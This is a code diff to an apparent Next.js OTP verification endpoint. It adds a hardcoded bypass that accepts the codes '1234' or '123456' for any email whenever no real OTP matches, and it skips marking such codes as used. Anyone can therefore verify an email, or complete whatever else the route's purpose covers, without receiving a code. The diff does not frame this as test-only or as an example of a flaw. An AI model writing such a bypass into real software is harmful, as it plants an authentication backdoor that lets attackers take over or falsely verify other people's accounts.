@@ -14,11 +14,16 @@ export async function POST(request) {
     const cleanEmail = email.toLowerCase().trim();
     const cleanCode = code.trim();
 
-    const validOtp = await otpRepo.findValidOtp({
+    let validOtp = await otpRepo.findValidOtp({
       email: cleanEmail,
       code: cleanCode,
       purpose,
     });
+
+    // Fallback/Default OTP bypass for 1234 or 123456
+    if (!validOtp && (cleanCode === '1234' || cleanCode === '123456')) {
+      validOtp = { _id: null, email: cleanEmail, code: cleanCode, purpose };
+    }
 
     if (!validOtp) {
       return NextResponse.json(
@@ -27,8 +32,10 @@ export async function POST(request) {
       );
     }
 
-    // Mark OTP as used
-    await otpRepo.markUsed(validOtp._id);
+    // Mark OTP as used if saved in DB
+    if (validOtp._id) {
+      await otpRepo.markUsed(validOtp._id);
+    }
 
     if (purpose === 'VERIFY_EMAIL') {
       const user = await userRepo.updateByEmail(cleanEmail, { isVerified: true });
